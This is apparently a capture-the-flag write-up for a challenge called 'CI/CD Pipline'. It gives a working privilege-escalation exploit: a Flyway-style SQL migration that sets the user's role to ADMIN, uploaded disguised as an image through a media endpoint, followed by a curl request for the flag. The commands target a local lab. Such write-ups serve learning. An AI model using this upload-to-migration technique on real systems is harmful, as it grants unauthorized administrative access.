# CI/CD Pipline

## Steps

create account with a username in this format `V<number>` (e.g v999)

upload sql file with filename as `sql` that contains a query to change your role into admin.

example query:

```sql
-- V20261127__update_srm_role.sql
BEGIN;

UPDATE users
SET role = 'ADMIN'
WHERE username = 'v999';

COMMIT;
```

```bash
curl 'http://localhost:8080/api/media/posts' -X POST -H "Authorization: Bearer $JWT" -F "file=@payload.sql;filename=sql;type=image/png"
```

wait until server restarts (every 5 minutes)

endpoint to get the flag:

```bash
curl 'http://localhost:8080/api/admin/flag' -X GET -H "Authorization: Bearer $JWT"
```
